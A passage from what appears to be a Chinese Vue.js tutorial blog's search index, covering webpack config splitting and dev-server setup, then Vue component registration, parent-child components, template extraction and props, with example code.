class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">  contentBase: <span class="string">'./dist/'</span>,</span><br><span class="line">  inline: <span class="literal">true</span>,</span><br><span class="line">  port: <span class="number">3333</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>相关参数说明:</strong></p><ul><li><p>contentBase：为哪一个文件夹提供本地服务，默认是根文件夹，我们这里要填写./dist</p></li><li><p>port：端口号</p></li><li><p>inline：页面实时刷新</p></li><li><p>historyApiFallback：在SPA页面中，依赖HTML5的history模式</p></li></ul><p><strong>在package.json文件中可以定义–open直接打开该服务</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"dev": "webpack-dev-server --open"</span><br></pre></td></tr></table></figure><h2 id="webpack配置文件的分离"><a href="#webpack配置文件的分离" class="headerlink" title="webpack配置文件的分离"></a>webpack配置文件的分离</h2><p>在开发中，一般大型的项目会需要配置很多plugin插件以及很多loader以及自身的相关配置，到后期整个文件会越来越大，代码可阅读性也会变得越来越差，并且，开发环境的有些配置在生产环境中是不需要的，所以我们可以按照基础必备配置、生产环境配置以及开发环境配置进行配置抽离，分为三个文件，并使用build文件夹将他们包裹起来</p><ol><li>base.config.js</li><li>prod.config.js</li><li>dev.config.js</li></ol><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E5%9B%9B%E3%80%81webpack%E5%85%A5%E9%97%A8/image-20200923113605570.png" alt="image-20200923113605570"></p><p>但是首先，你需要安装相关的npm插件用来合并vue配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install webpack-merge --save-dev</span><br></pre></td></tr></table></figure><p>引入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> webpackMerge = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br></pre></td></tr></table></figure><p>然后对之前的整个配置文件分离后可得到下面的各个配置base.config.js</p><p>dev.config.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> webpackMerge = <span class="built_in">require</span>(<span class="string">'webpack-merge'</span>)</span><br><span class="line"><span class="keyword">const</span> baseConfig = <span class="built_in">require</span>(<span class="string">'./base.config'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = webpackMerge(baseConfig, &#123;</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    contentBase: <span class="string">'./dist'</span>,</span><br><span class="line">    inline: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>修改base.config.js的打包输出路径， <code>path: path.join(__dirname, &#39;../dist&#39;)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: <span class="string">'./main.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.join(__dirname, <span class="string">'../dist'</span>),</span><br><span class="line">    filename: <span class="string">'bundle.js'</span>,</span><br><span class="line">    <span class="comment">// publicPath: 'dist/'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置package.json文件，修改生产环境的运行代码和开发环境的运行代码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">"build": "webpack --config ./build/prod.config.js",</span><br><span class="line">"dev": "webpack-dev-server --open --config ./build/dev.config.js"</span><br></pre></td></tr></table></figure><h2 id="打包文件解析"><a href="#打包文件解析" class="headerlink" title="打包文件解析"></a>打包文件解析</h2><p><strong>app.js</strong></p><p>当前应用程序开发的所有代码</p><p><strong>mainifest</strong></p><p>打包代码的底层支持~联想一下CommonJS AMD CMD标准</p><p>使浏览器能识别那些导出导入规则</p><p><strong>vendor</strong><br>第三方框架（bs\axios\vue）代码</p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三、组件化开发</title>
      <link href="/2021/03/01/%E4%B8%89%E3%80%81Vue%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91/"/>
      <url>/2021/03/01/%E4%B8%89%E3%80%81Vue%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="组件化介绍"><a href="#组件化介绍" class="headerlink" title="组件化介绍"></a>组件化介绍</h1><p>人面对一个复杂的大问题往往手足无措，不知道从何入手，因为每个人的逻辑处理能力都是有限的，但是，人类善于拆解，分解，将一个大问题拆解成多个小问题，因此，你会发现，当一个大问题被拆解成多个小问题后，这些小问题会更容易解决，当他们都一一解决后，那么大问题同时也迎刃而解了，这便是组件化思想</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%89%E3%80%81Vue%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91/image-20200912083354481.png" alt="image-20200912083354481"></p><h2 id="组件化思想"><a href="#组件化思想" class="headerlink" title="组件化思想"></a>组件化思想</h2><ul><li>将一个完整的页面分成很多个组件</li><li>每个组件用域实现页面的一个功能块</li><li>每一个组件还可以进一步细分</li></ul><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%89%E3%80%81Vue%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91/image-20200912083017148.png" alt="image-20200912083017148"></p><p>组件化是Vue.js中的重要思想</p><ul><li><p>它提供了一种抽象，让我们可以开发出一个个独立可复用的小组件来构造我们的应用。</p></li><li><p>任何的应用都会被抽象成一颗组件树。</p></li></ul><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%89%E3%80%81Vue%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91/image-20200912083505764.png" alt="image-20200912083505764"></p><h2 id="组件化应用"><a href="#组件化应用" class="headerlink" title="组件化应用"></a>组件化应用</h2><ul><li>利用组件化尽可能的将页面拆分成一个个小的、可复用的组件。</li><li>让代码更加方便组织和管理，并且扩展性也更强。</li></ul><h1 id="注册组件的基本步骤"><a href="#注册组件的基本步骤" class="headerlink" title="注册组件的基本步骤"></a>注册组件的基本步骤</h1><p><strong>前提</strong>：组件必须在vue绑定的dom对象中使用</p><ol><li>创建组件构造器</li><li>注册组件</li><li>使用组件</li></ol><p><strong>代码演示</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app1"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 使用，需要在vue挂载对应的Dom对象里使用 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span>&gt;</span><span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">//创建组件构造器对象</span></span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> cpnC = Vue.extend(&#123;</span></span><br><span class="line">    template: `</span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>        </span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>我很好呀呀呀呀<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`</span></span></span><br><span class="line">  &#125;)</span><br><span class="line"><span class="actionscript">  <span class="comment">//注册组件</span></span></span><br><span class="line"><span class="actionscript">  Vue.component(<span class="string">'app'</span>, cpnC)</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">  <span class="comment">//绑定Dom</span></span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app1 = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app1'</span></span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="各个步骤含义"><a href="#各个步骤含义" class="headerlink" title="各个步骤含义"></a>各个步骤含义</h2><ol><li><p>Vue.extend()</p><ul><li>调用Vue.extend()创建的是一个组件构造器。 </li><li>通常在创建组件构造器时，传入template代表我们自定义组件的模板。</li><li>该模板就是在使用到组件的地方，要显示的HTML代码。</li><li>这种写法在文档中几乎已经看不到了，它会直接使用下后面讲到的<strong>语法糖</strong>，但是在很多资料还是会提到这种方式，而且这种方式是学习后面方式的基础。</li></ul></li><li><p>Vue.component(注册组件标签名, 组件构造器)：</p><ul><li><p>调用Vue.component()是将刚才的组件构造器注册为一个组件，并且给它起一个组件的标签名称。</p></li><li><p>所以需要传递两个参数：1、注册组件的标签名 2、组件构造器</p></li></ul></li><li><p>在使用上，直接在html页面中你需要定义的地方使用该标签即可，但要注意一点，它<strong>必须挂载在某个Vue实例下</strong>，否则它不会生效</p></li></ol><h1 id="全局组件和局部组件"><a href="#全局组件和局部组件" class="headerlink" title="全局组件和局部组件"></a>全局组件和局部组件</h1><ol><li><p>全局使用</p><p>直接在全局使用Vue的component方法，这样，只要在任意有绑定的dom节点下，就可以使用该组件</p></li><li><p>局部使用</p><p>在绑定的dom节点中添加componet属性，并关联注册上该组件，这样，就只能在绑定的dom节点下使用该组件</p></li></ol><p>直接上代码理解</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cnpm</span>&gt;</span><span class="tag">&lt;/<span class="name">cnpm</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app2"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cnpm</span>&gt;</span><span class="tag">&lt;/<span class="name">cnpm</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">//创建组件构造器对象</span></span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> cnpm = Vue.extend(&#123;</span></span><br><span class="line">    template:`</span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>吃饭了吗<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`</span></span></span><br><span class="line">  &#125;)</span><br><span class="line">  </span><br><span class="line"><span class="actionscript">  <span class="comment">//注册组件,全局使用</span></span></span><br><span class="line"><span class="actionscript">  <span class="comment">// Vue.component('cnpm',cnpm)</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">"#app"</span>,</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//注册组件，局部使用</span></span></span><br><span class="line">    components: &#123;</span><br><span class="line">      cnpm: cnpm</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app2 = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">"#app2"</span>,</span></span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="父组件和子组件"><a href="#父组件和子组件" class="headerlink" title="父组件和子组件"></a>父组件和子组件</h1><p>在前面我们看到了组件树：</p><ul><li><p>组件和组件之间存在层级关系</p></li><li><p>而其中有一种非常重要的关系就是父子组件的关系</p></li></ul><p>上代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;Cpn1&gt;&lt;/Cpn1&gt;会被忽略解析，因为它只是被父组件识别，#app并没有注册它 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Cpn1</span>&gt;</span><span class="tag">&lt;/<span class="name">Cpn1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Cpn2</span>&gt;</span><span class="tag">&lt;/<span class="name">Cpn2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="actionscript"><span class="comment">//创建组件构造器对象（子组件）</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> cpnC1 = Vue.extend(&#123;</span></span><br><span class="line">  template: `</span><br><span class="line"><span class="actionscript">      &lt;<span class="keyword">var</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是子组件<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="actionscript">      &lt;/<span class="keyword">var</span>&gt;`</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">//创建父组件构造器对象</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> cpnC2 = Vue.extend(&#123;</span></span><br><span class="line">  template: `</span><br><span class="line"><span class="actionscript">      &lt;<span class="keyword">var</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是父组件<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">Cpn1</span>&gt;</span><span class="tag">&lt;/<span class="name">Cpn1</span>&gt;</span></span></span></span><br><span class="line"><span class="actionscript">      &lt;/<span class="keyword">var</span>&gt;`,</span></span><br><span class="line">  components: &#123;</span><br><span class="line">    Cpn1: cpnC1</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">//全局使用</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// Vue.component('Cpn2', cpnC2)</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">//绑定Dom节点</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">  el: <span class="string">'#app'</span>,</span></span><br><span class="line">  components: &#123;</span><br><span class="line">    Cpn2: cpnC2,</span><br><span class="line"><span class="actionscript">    <span class="comment">// Cpn1: cpnC1</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在其中要注意的一个点是（注释也有）：<Cpn1></Cpn1>标签会被忽略解析，因为它只是被父组件识别，#app（爷爷组件）并没有注册它</p><h1 id="注册组件语法糖"><a href="#注册组件语法糖" class="headerlink" title="注册组件语法糖"></a>注册组件语法糖</h1><p>在注册组件的同时可以用一个对象用来直接创建组件构造器对象，如下代码所示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">//常规方法</span></span><br><span class="line">   <span class="comment">//创建组件构造器</span></span><br><span class="line">   <span class="comment">// const a = Vue.extend(&#123;</span></span><br><span class="line">   <span class="comment">//   template:`</span></span><br><span class="line">   <span class="comment">//     &lt;div&gt;我是全局注册组件&lt;/div&gt;`</span></span><br><span class="line">   <span class="comment">// &#125;)</span></span><br><span class="line">   <span class="comment">//注册组件</span></span><br><span class="line">   <span class="comment">// Vue.component('cpn1',a)</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">//语法糖</span></span><br><span class="line">   Vue.component(<span class="string">'cpn1'</span>,&#123;</span><br><span class="line">     template:<span class="string">`</span></span><br><span class="line"><span class="string">       &lt;div&gt;我是全局注册组件&lt;/div&gt;`</span></span><br><span class="line">   &#125;)</span><br></pre></td></tr></table></figure><h1 id="组件抽离"><a href="#组件抽离" class="headerlink" title="组件抽离"></a>组件抽离</h1><ol><li>在script标签内书写代码，需要定义type属性和id属性</li><li>直接使用template标签，定义id属性用来绑定</li></ol><p>上代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn1</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 抽离方法一 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/x-template"</span> <span class="attr">id</span>=<span class="string">"cpnC1"</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>哈哈哈哈哈哈<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 抽离方法二 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"cpnC2"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>呵呵呵呵呵呵<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">//全局使用</span></span></span><br><span class="line"><span class="actionscript">  Vue.component(<span class="string">'cpn1'</span>,&#123;</span></span><br><span class="line"><span class="actionscript">    template: <span class="string">'#cpnC2'</span></span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    components: &#123;</span><br><span class="line">      cpn: &#123;</span><br><span class="line"><span class="actionscript">        template:<span class="string">'#cpnC1'</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="组件数据存放问题"><a href="#组件数据存放问题" class="headerlink" title="组件数据存放问题"></a>组件数据存放问题</h1><ol><li><p>🔺组件无法访问Vue实例的数据</p></li><li><p>组件数据的存放</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(<span class="string">'cpn'</span>, &#123;</span><br><span class="line">  template: <span class="string">"#cpnC"</span>,</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      message: <span class="string">'你好啊'</span> <span class="comment">//组件拥有保留自己数据的data函数（注意，是函数），通过返回一个对象获取数据</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件数据存放为何要用一个函数</p><blockquote><p>这里涉及到data为什么是函数的问题（你需要了解作用域以及堆和栈的知识）</p></blockquote><p>当我们想用我们自己创建的组件时，我们是希望每个组件都是独立存在，互不干扰的，而如果你将data定义成一个对象（当然，如果你想，Vue也是不允许的）时，它每次赋给组件时候，返回都是固定的值（值引用），相当于你每次操作加减，最后多个组件都会得到同样的值，这并不是我们想看到的，我们希望每个加减器都是独立存在的，而如果用函数定义data时，因为函数作用域的原因，它每次都会返回不同的内存地址，而当组件去引用它们时，就会指向属于各自的内存地址，从而实现数据上的独立性，避免产生连锁反应</p></li></ol><h1 id="父子组件的通信"><a href="#父子组件的通信" class="headerlink" title="父子组件的通信"></a>父子组件的通信</h1><p>如何进行父子组件间的通信</p><ol><li><p>通过props向子组件传递数据</p></li><li><p>通过事件向父组件发送消息</p></li><li><p>真实的开发中，<strong>Vue实例和子组件的通信</strong>和<strong>父组件和子组件的通信</strong>过程是一样的</p></li></ol><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%89%E3%80%81Vue%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91/image-20200914140042681.png" alt="image-20200914140042681"></p><h2 id="父组件向子组件传递数据"><a href="#父组件向子组件传递数据" class="headerlink" title="父组件向子组件传递数据"></a>父组件向子组件传递数据</h2><ol><li><p>在组件中，使用选项props来声明需要从父级接收到的数据。</p></li><li><p>props的值有两种方式：</p><ul><li>方式一：字符串数组，数组中的字符串就是传递时的名称。</li><li>方式二：对象，对象可以设置传递时的类型，也可以设置默认值等。</li></ul></li><li><p>步骤</p><ol><li>创建子模版（template），创建子组件绑定该模板</li><li>父组件绑定子组件（components）</li><li>子组件定义属性（props）</li><li>在vue实例绑定的dom节点里创建子标签，同时动态绑定父模组件数据（v-bind:）</li><li>子组件使用父组件的数据</li></ol></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 